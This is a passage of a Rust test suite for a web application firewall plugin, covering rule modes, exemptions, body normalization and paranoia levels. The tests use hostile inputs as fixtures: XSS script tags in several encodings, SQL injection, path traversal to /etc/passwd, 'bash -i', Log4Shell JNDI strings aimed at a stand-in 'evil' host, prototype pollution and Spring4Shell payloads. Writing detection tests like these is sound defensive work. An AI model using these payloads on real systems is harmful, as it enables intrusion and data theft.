    let mut ctx = ctx("GET", "/debug");
    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);

    let result = plugin
        .on_final_response_body(&mut ctx, 200, &headers, b"\xffq=%3Cscript%3E")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-RESP-LOSSY"))
    );
}

#[tokio::test]
async fn uppercase_html_entities_are_decoded_for_body_rules() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001-B": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "text/html".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            b"&LT;script&GT;alert(1)&LT;/script&GT;",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-XSS-001-B"))
    );
}

#[tokio::test]
async fn decoded_body_rules_scan_leading_zero_numeric_html_entities() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001-B": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "text/html".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            b"&#000000060;script&#000000062;alert(1)&#000000060;/script&#000000062;",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-XSS-001-B"))
    );
}

#[test]
fn invalid_custom_regex_is_rejected() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-1",
            "name": "bad",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "regex",
            "pattern": "("
        }]
    }))
    .unwrap_err();

    assert!(err.contains("RegexSet"));
}

#[test]
fn luhn_match_kind_requires_body_target() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-LUHN-1",
            "name": "bad target",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "luhn"
        }]
    }))
    .unwrap_err();

    assert!(err.contains("match_kind luhn is only supported for body targets"));
}

#[test]
fn target_object_rejects_irrelevant_fields() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-BAD-NAMES",
            "name": "bad names",
            "category": "custom",
            "severity": "high",
            "target": { "type": "query_values", "names": ["x-forwarded-for"] },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();
    assert!(err.contains("does not support 'names'"));

    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-BAD-PATH",
            "name": "bad path",
            "category": "custom",
            "severity": "high",
            "target": { "type": "response_body", "path": "message" },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();
    assert!(err.contains("does not support 'path'"));
}

#[test]
fn header_value_target_names_must_be_non_empty_when_provided() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-EMPTY-NAMES",
            "name": "empty names",
            "category": "custom",
            "severity": "high",
            "target": { "type": "header_values", "names": [] },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();

    assert!(err.contains("names"));
    assert!(err.contains("non-empty"));
}

#[test]
fn waf_is_security_critical() {
    assert_eq!(
        plugin_failure_policy("waf"),
        Some(PluginFailurePolicy::FailClosed)
    );
}

#[tokio::test]
async fn duplicate_query_key_cannot_smuggle_payload_past_query_values_rule() {
    // Regression: `materialize_query_params()` collapses duplicate keys into a
    // `HashMap`. The proxy materializes query params before WAF authorize runs,
    // so `?q=<script>&q=ok` previously left only `q=ok` visible in the normal
    // pipeline and the XSS payload slipped past an enforced query_values rule.
    // The fix preserves the raw query string after materialization and scans
    // each raw pair.
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E&q=ok".into());
    ctx.materialize_query_params();
    assert_eq!(
        ctx.query_params.get("q").map(String::as_str),
        Some("ok"),
        "materialized HashMap should mirror the proxy path and keep the last duplicate"
    );
    assert!(
        ctx.raw_query_string().is_some(),
        "raw query must remain available for WAF duplicate-pair inspection"
    );

    let result = plugin.authorize(&mut ctx).await;

    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn parsed_query_params_are_scanned_when_raw_query_is_absent() {
    let plugin = Waf::new(&json!({
        "rule_modes": {
            "FE-XSS-001": "enforce",
            "FE-PATHTRAV-001": "enforce"
        }
    }))
    .unwrap();
    let mut query_ctx = ctx("GET", "/search");
    query_ctx
        .query_params
        .insert("q".into(), "<script>alert(1)</script>".into());

    let result = plugin.authorize(&mut query_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        query_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );

    let mut full_url_ctx = ctx("GET", "/download");
    full_url_ctx
        .query_params
        .insert("file".into(), "../etc/passwd".into());
    let result = plugin.authorize(&mut full_url_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        full_url_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-PATHTRAV-001")
    );
}

#[tokio::test]
async fn plus_encoded_query_space_is_detected_by_query_value_rules() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-SQLI-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select".into());
    ctx.materialize_query_params();

    let result = plugin.authorize(&mut ctx).await;

    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-SQLI-001")
    );
}

#[tokio::test]
async fn disabled_default_rules_are_skipped() {
    let plugin = Waf::new(&json!({
        "disabled_default_rules": ["FE-XSS-001"],
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-XSS-001"))
    );
}

#[tokio::test]
async fn paranoia_level_filters_custom_rules() {
    let config = json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-PL1",
                "name": "pl1",
                "category": "custom",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "never-matches",
                "action": "monitor",
                "paranoia_min": 1
            },
            {
                "id": "CUSTOM-PL2",
                "name": "pl2",
                "category": "custom",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "needle",
                "action": "enforce",
                "paranoia_min": 2
            }
        ]
    });

    let plugin = Waf::new(&config).unwrap();
    let mut low_ctx = ctx("GET", "/search");
    low_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut low_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !low_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-PL2"))
    );

    let mut high_config = config;
    high_config["paranoia_level"] = json!(2);
    let plugin = Waf::new(&high_config).unwrap();
    let mut high_ctx = ctx("GET", "/search");
    high_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut high_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        high_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("CUSTOM-PL2")
    );
}

#[tokio::test]
async fn inspect_multipart_gates_body_scanning() {
    let default_plugin = Waf::new(&json!({
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut default_ctx = ctx("POST", "/upload");
    default_ctx.headers.insert(
        "content-type".into(),
        "multipart/form-data; boundary=abc".into(),
    );
    let headers = default_ctx.headers.clone();

    let result = default_plugin
        .on_final_request_body_with_context(&mut default_ctx, &headers, b"bash -i")
        .await;
    assert!(matches!(result, PluginResult::Continue));

    let multipart_plugin = Waf::new(&json!({
        "inspect_multipart": true,
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut multipart_ctx = ctx("POST", "/upload");
    multipart_ctx.headers.insert(
        "content-type".into(),
        "multipart/form-data; boundary=abc".into(),
    );
    let headers = multipart_ctx.headers.clone();

    let result = multipart_plugin
        .on_final_request_body_with_context(&mut multipart_ctx, &headers, b"bash -i")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[test]
fn response_body_buffering_narrows_to_inspectable_content_types() {
    // With response body inspection enabled, the WAF requests buffering at the
    // pre-flight check (content-type unknown), but once the response
    // content-type is known it only needs the body for inspectable
    // (allowlisted) types. The proxy uses this to stream non-allowlisted/binary
    // responses instead of buffering-then-skipping them.
    let plugin = Waf::new(&json!({
        "response_inspection": true,
        "response_body_inspection": true,
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/download");
    ctx.headers
        .insert("accept".to_string(), "text/event-stream".to_string());

    // Pre-flight (content-type-agnostic) decision buffers even when the client
    // asks for SSE; only the pristine response representation may release it.
    assert!(plugin.should_buffer_response_body(&ctx));
    let headers = HashMap::new();
    let sse_headers =
        HashMap::from([("content-type".to_string(), "text/event-stream".to_string())]);
    assert!(plugin.may_release_response_body_under_retries(&ctx));
    assert!(plugin.should_release_response_body_under_retries(&ctx, 200, &sse_headers));
    assert!(
        plugin.should_release_response_body_before_content_type_rewrite(&ctx, 200, &sse_headers,)
    );
    assert!(!plugin.should_release_response_body_under_retries(&ctx, 200, &headers));
    assert!(!plugin.should_release_response_body_before_content_type_rewrite(&ctx, 200, &headers));

    // Allowlisted content-types stay buffered (they will be scanned).
    assert!(plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("text/html"),
        200,
        &headers
    ));
    assert!(plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("application/json"),
        200,
        &headers
    ));
    assert!(plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("application/json; profile=event-stream"),
        200,
        &headers
    ));

    // Non-allowlisted / binary / missing content-types narrow to false so the
    // proxy streams them instead of buffering a body the WAF will not scan.
    assert!(!plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("application/octet-stream"),
        200,
        &headers
    ));
    assert!(!plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("image/png"),
        200,
        &headers
    ));
    assert!(!plugin.should_buffer_response_body_for_content_type(
        &ctx,
        Some("text/event-stream"),
        200,
        &headers
    ));
    assert!(!plugin.should_buffer_response_body_for_content_type(&ctx, None, 200, &headers));
}

#[tokio::test]
async fn enforcing_waf_fails_closed_on_unbounded_event_stream() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "response_body_inspection": true,
        "custom_rules": [{
            "id": "R-SSE",
            "name": "response secret",
            "category": "test",
            "severity": "high",
            "target": "response_body",
            "match_kind": "contains",
            "pattern": "secret",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/events");
    let mut response_headers =
        HashMap::from([("content-type".to_string(), "text/event-stream".to_string())]);

    assert!(matches!(
        plugin
            .after_proxy(&mut ctx, 200, &mut response_headers)
            .await,
        PluginResult::Reject {
            status_code: 403,
            ..
        }
    ));
    assert_eq!(
        ctx.metadata.get("waf.block_reason").map(String::as_str),
        Some("unbounded_response_stream")
    );
}

#[tokio::test]
async fn explicit_skip_allows_unbounded_event_stream_with_metadata() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "response_body_inspection": true,
        "on_body_too_large": "skip",
        "custom_rules": [{
            "id": "R-SSE-SKIP",
            "name": "response secret",
            "category": "test",
            "severity": "high",
            "target": "response_body",
            "match_kind": "contains",
            "pattern": "secret",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/events");
    let mut response_headers =
        HashMap::from([("content-type".to_string(), "text/event-stream".to_string())]);

    assert!(matches!(
        plugin
            .after_proxy(&mut ctx, 200, &mut response_headers)
            .await,
        PluginResult::Continue
    ));
    assert_eq!(
        ctx.metadata
            .get("waf.response_stream_uninspectable")
            .map(String::as_str),
        Some("true")
    );
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("stream_uninspected")
    );
}

#[tokio::test]
async fn monitor_only_waf_allows_unbounded_event_stream_with_metadata() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "mode": "monitor",
        "response_inspection": true,
        "response_body_inspection": true,
        "custom_rules": [{
            "id": "R-SSE-MONITOR",
            "name": "response secret",
            "category": "test",
            "severity": "high",
            "target": "response_body",
            "match_kind": "contains",
            "pattern": "secret",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/events");
    let mut response_headers =
        HashMap::from([("content-type".to_string(), "text/event-stream".to_string())]);

    assert!(matches!(
        plugin
            .after_proxy(&mut ctx, 200, &mut response_headers)
            .await,
        PluginResult::Continue
    ));
    assert_eq!(
        ctx.metadata
            .get("waf.response_stream_uninspectable")
            .map(String::as_str),
        Some("true")
    );
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("stream_uninspected")
    );
}

#[tokio::test]
async fn oversized_body_skip_mode_does_not_scan_truncated_prefix() {
    let plugin = Waf::new(&json!({
        "max_scan_bytes": 4,
        "on_body_too_large": "skip",
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    ctx.headers.insert("content-length".into(), "16".into());
    let headers = ctx.headers.clone();

    assert!(!plugin.should_buffer_request_body(&ctx));
    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"bash -i and more")
        .await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
}

#[tokio::test]
async fn clean_truncated_scan_preserves_owned_log_metadata() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "max_scan_bytes": 4,
        "custom_rules": [{
            "id": "CUSTOM-MISS",
            "name": "missing body marker",
            "category": "custom",
            "severity": "low",
            "target": "body_text",
            "match_kind": "contains",
            "pattern": "needle",
            "action": "monitor"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "text/plain".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"clean body")
        .await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        clone_log_metadata(&ctx)
            .get("waf.scan_truncated")
            .map(String::as_str),
        Some("true")
    );
}

#[tokio::test]
async fn per_rule_false_positive_filters_suppress_hits() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-FP",
            "name": "fp filter",
            "category": "custom",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "fp_filters": ["needle ok"],
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut suppressed = ctx("GET", "/search");
    suppressed.set_raw_query_string("q=needle%20ok".into());
    let result = plugin.authorize(&mut suppressed).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));

    let mut blocked = ctx("GET", "/search");
    blocked.set_raw_query_string("q=needle%20bad".into());
    let result = plugin.authorize(&mut blocked).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn global_exemptions_cover_ips_headers_and_capture_filters() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" },
        "global_exemptions": {
            "ips": ["10.0.0.0/8"],
            "header_present": { "x-waf-fp": "known" },
            "fp_capture_filters": ["<script>safe</script>"]
        }
    }))
    .unwrap();

    let mut ip_ctx = RequestContext::new("10.1.2.3".into(), "GET".into(), "/search".into());
    ip_ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());
    let result = plugin.authorize(&mut ip_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!ip_ctx.metadata.contains_key("waf.rule_hits"));

    let mut header_ctx = ctx("GET", "/search");
    header_ctx.headers.insert("x-waf-fp".into(), "known".into());
    header_ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());
    let result = plugin.authorize(&mut header_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!header_ctx.metadata.contains_key("waf.rule_hits"));

    let mut capture_ctx = ctx("GET", "/search");
    capture_ctx.set_raw_query_string("q=%3Cscript%3Esafe%3C/script%3E".into());
    let result = plugin.authorize(&mut capture_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!capture_ctx.metadata.contains_key("waf.rule_hits"));
}

#[test]
fn invalid_global_exemption_cidr_fails_construction() {
    let err = Waf::new(&json!({
        "global_exemptions": { "ips": ["not-a-cidr"] }
    }))
    .unwrap_err();

    assert!(err.contains("global_exemptions.ips"));
    assert!(err.contains("not-a-cidr"));
}

#[test]
fn unknown_disabled_default_rule_id_fails_construction() {
    let err = Waf::new(&json!({
        "disabled_default_rules": ["FE-XSS-999"]
    }))
    .unwrap_err();

    assert!(err.contains("disabled_default_rules"));
    assert!(err.contains("FE-XSS-999"));
}

#[test]
fn unknown_rule_modes_id_fails_construction() {
    // WAF is security-critical: a typo in an `enforce` override would
    // otherwise silently leave the rule monitor-only.
    let err = Waf::new(&json!({
        "rule_modes": { "FE-XSS-99": "enforce" }
    }))
    .unwrap_err();
    assert!(err.contains("unknown rule id"));
    assert!(err.contains("FE-XSS-99"));
}

#[tokio::test]
async fn body_normalization_catches_escaped_payload_the_raw_scan_misses() {
    // A custom body rule matches `<script`. The payload arrives `\x`-escaped,
    // so the raw byte scan never sees the tag — only the decode/normalization
    // pass recovers it. Regression guard for the body-evasion gap.
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-XSS-BODY",
            "name": "script tag in body",
            "category": "custom",
            "severity": "high",
            "target": "body_text",
            "match_kind": "contains",
            "pattern": "<script",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    // Sanity: the literal escaped form does not contain `<script`.
    let escaped = br"{q:\x3cscript\x3ealert(1)}";
    assert!(!escaped.windows(7).any(|w| w == b"<script"));

    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, escaped)
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-XSS-BODY")
    );
}

#[tokio::test]
async fn body_normalization_redecodes_unicode_escaped_html_entities() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001-B": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();
    let escaped = br#"{"comment":"\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;"}"#;
    assert!(!escaped.windows(7).any(|w| w == b"<script"));
    assert!(!escaped.windows(10).any(|w| w == b"&lt;script"));

    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, escaped)
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(monitored(&ctx, "FE-XSS-001-B"));
}

fn monitored(ctx: &RequestContext, rule_id: &str) -> bool {
    ctx.metadata
        .get("waf.rule_hits")
        .is_some_and(|hits| hits.split(',').any(|hit| hit == rule_id))
}

#[tokio::test]
async fn jndi_log4shell_detected_in_header_query_and_body() {
    let plugin = Waf::new(&json!({})).unwrap();

    // Header delivery — the original rule pack never scanned header values
    // for injection payloads, the primary Log4Shell channel.
    let mut header_ctx = ctx("GET", "/");
    header_ctx
        .headers
        .insert("user-agent".into(), "${jndi:ldap://evil/x}".into());
    let _ = plugin.authorize(&mut header_ctx).await;
    assert!(monitored(&header_ctx, "FE-JNDI-001-H"));

    // Query delivery.
    let mut query_ctx = ctx("GET", "/search");
    query_ctx.set_raw_query_string("x=${jndi:rmi://evil/x}".into());
    let _ = plugin.authorize(&mut query_ctx).await;
    assert!(monitored(&query_ctx, "FE-JNDI-001-Q"));

    // Body delivery.
    let mut body_ctx = ctx("POST", "/submit");
    body_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = body_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut body_ctx,
            &headers,
            br#"{"a":"${jndi:dns://evil/x}"}"#,
        )
        .await;
    assert!(monitored(&body_ctx, "FE-JNDI-001-B"));
}

#[tokio::test]
async fn prototype_pollution_and_spring4shell_detected_in_body() {
    let plugin = Waf::new(&json!({})).unwrap();

    let mut proto_ctx = ctx("POST", "/submit");
    proto_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = proto_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut proto_ctx,
            &headers,
            br#"{"__proto__":{"polluted":true}}"#,
        )
        .await;
    assert!(monitored(&proto_ctx, "FE-PROTO-001"));

    let mut spring_ctx = ctx("POST", "/submit");
    spring_ctx.headers.insert(
        "content-type".into(),
        "application/x-www-form-urlencoded".into(),
    );
    let headers = spring_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut spring_ctx,
            &headers,
            b"class.module.classLoader.resources.context.parent.pipeline=x",
        )
        .await;
    assert!(monitored(&spring_ctx, "FE-SPRING4SHELL-001-B"));
}

#[tokio::test]
async fn xss_and_traversal_now_covered_in_request_body() {
    let plugin = Waf::new(&json!({})).unwrap();

    let mut xss_ctx = ctx("POST", "/submit");
    xss_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = xss_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut xss_ctx,
            &headers,
            br#"{"comment":"<script>alert(1)</script>"}"#,
        )
        .await;
    assert!(monitored(&xss_ctx, "FE-XSS-001-B"));

    let mut trav_ctx = ctx("POST", "/submit");
    trav_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = trav_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut trav_ctx,
            &headers,
            br#"{"file":"../../etc/passwd"}"#,
        )
        .await;
    assert!(monitored(&trav_ctx, "FE-PATHTRAV-001-B"));
    assert!(monitored(&trav_ctx, "FE-LFI-001-B"));
}

#[tokio::test]
async fn ssti_arithmetic_probe_fires_but_plain_template_does_not_at_default_paranoia() {
    let plugin = Waf::new(&json!({})).unwrap();

    let mut probe_ctx = ctx("POST", "/submit");
    probe_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = probe_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(&mut probe_ctx, &headers, br#"{"name":"{{7*7}}"}"#)
        .await;
    assert!(monitored(&probe_ctx, "FE-SSTI-002"));

    // A plain template variable is not an attack. The broad `{{...}}` marker
    // (FE-SSTI-001) is now gated behind paranoia_level >= 2, so nothing fires.
    let mut plain_ctx = ctx("POST", "/submit");
    plain_ctx
        .headers
        .insert("content-type".into(), "application/json".into());
    let headers = plain_ctx.headers.clone();
    let _ = plugin
        .on_final_request_body_with_context(
            &mut plain_ctx,
            &headers,
            br#"{"template":"Hello {{ username }}"}"#,
        )
        .await;
    assert!(!plain_ctx.metadata.contains_key("waf.rule_hits"));
}

#[tokio::test]
async fn retuned_loud_rules_are_silent_at_default_paranoia() {
    let plugin = Waf::new(&json!({})).unwrap();

    // Hex color `#fff` previously tripped the SQL-comment-token rule
    // (FE-SQLI-004), now gated to paranoia_level >= 2.
    let mut color_ctx = ctx("GET", "/search");
    color_ctx.set_raw_query_string("color=#fff".into());
    let _ = plugin.authorize(&mut color_ctx).await;
    assert!(!monitored(&color_ctx, "FE-SQLI-004"));

    // A bare URL in a query parameter previously tripped FE-RFI-001.
    let mut url_ctx = ctx("GET", "/redirect");
    url_ctx.set_raw_query_string("next=https://example.com/path".into());
    let _ = plugin.authorize(&mut url_ctx).await;
    assert!(!monitored(&url_ctx, "FE-RFI-001"));
}

#[tokio::test]
async fn raised_paranoia_level_reactivates_retuned_rules() {
    let plugin = Waf::new(&json!({ "paranoia_level": 2 })).unwrap();
    let mut url_ctx = ctx("GET", "/redirect");
    url_ctx.set_raw_query_string("next=https://example.com/path".into());
    let _ = plugin.authorize(&mut url_ctx).await;
    assert!(monitored(&url_ctx, "FE-RFI-001"));
}

#[tokio::test]
async fn default_rule_action_enforce_blocks_built_in_rules() {
    // The crux of gap 1.1: a single switch flips the built-in pack from
    // monitor-only to enforcing, instead of one rule_modes entry per rule.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce"
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-SQLI-001")
    );
}

#[tokio::test]
async fn default_rule_action_enforce_monitors_when_global_mode_is_monitor() {
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "default_rule_action": "enforce"
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
    assert!(!ctx.metadata.contains_key("waf.first_blocking_rule"));
}

#[tokio::test]
async fn rule_modes_still_overrides_default_rule_action() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "rule_modes": { "FE-SQLI-001": "monitor" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=union+select+1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
}

#[tokio::test]
async fn rule_override_attaches_fp_filter_to_built_in_rule() {
    // Gap 1.6: tune a noisy built-in without forking the rule pack.
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "rule_overrides": { "FE-SQLI-001": { "fp_filters": ["union select version_id"] } }
    }))
    .unwrap();

    let mut suppressed = ctx("GET", "/report");
    suppressed.set_raw_query_string("q=union+select+version_id".into());
    assert!(matches!(
        plugin.authorize(&mut suppressed).await,
        PluginResult::Continue
    ));

    let mut blocked = ctx("GET", "/report");
    blocked.set_raw_query_string("q=union+select+password".into());
    assert!(matches!(
        plugin.authorize(&mut blocked).await,
        PluginResult::Reject { .. }
    ));
}

#[tokio::test]
async fn rule_override_fp_filter_suppresses_special_encoding_rule() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "rule_overrides": {
            "FE-ENCODING-001": { "fp_filters": ["known%252fpath"] }
        }
    }))
    .unwrap();

    let mut suppressed = ctx("GET", "/known%252fpath");
    assert!(matches!(
        plugin.authorize(&mut suppressed).await,
        PluginResult::Continue
    ));
    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));

    let mut blocked = ctx("GET", "/blocked%252fpath");
    assert!(matches!(
        plugin.authorize(&mut blocked).await,
        PluginResult::Reject { .. }
    ));
    assert_eq!(
        blocked
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-ENCODING-001")
    );
}

#[tokio::test]
async fn rule_override_fp_filter_suppresses_special_hpp_rule() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "rule_overrides": {
            "FE-HPP-001": { "fp_filters": ["role=user&role=admin"] }
        }
    }))
    .unwrap();

    let mut suppressed = ctx("GET", "/search");
    suppressed.set_raw_query_string("role=user&role=admin".into());
    assert!(matches!(
        plugin.authorize(&mut suppressed).await,
        PluginResult::Continue
    ));
    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));

    let mut blocked = ctx("GET", "/search");
    blocked.set_raw_query_string("role=user&role=root".into());
    assert!(matches!(
        plugin.authorize(&mut blocked).await,
        PluginResult::Reject { .. }
    ));
    assert_eq!(
        blocked
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-HPP-001")
    );
}

#[tokio::test]
async fn rule_override_scopes_built_in_rule_to_paths() {
    let plugin = Waf::new(&json!({
        "mode": "enforce",
        "default_rule_action": "enforce",
        "rule_overrides": { "FE-SQLI-001": { "conditions": { "paths": ["/api*"] } } }
    }))
    .unwrap();

    let mut outside = ctx("GET", "/public");
    outside.set_raw_query_string("q=union+select+1".into());
    assert!(matches!(
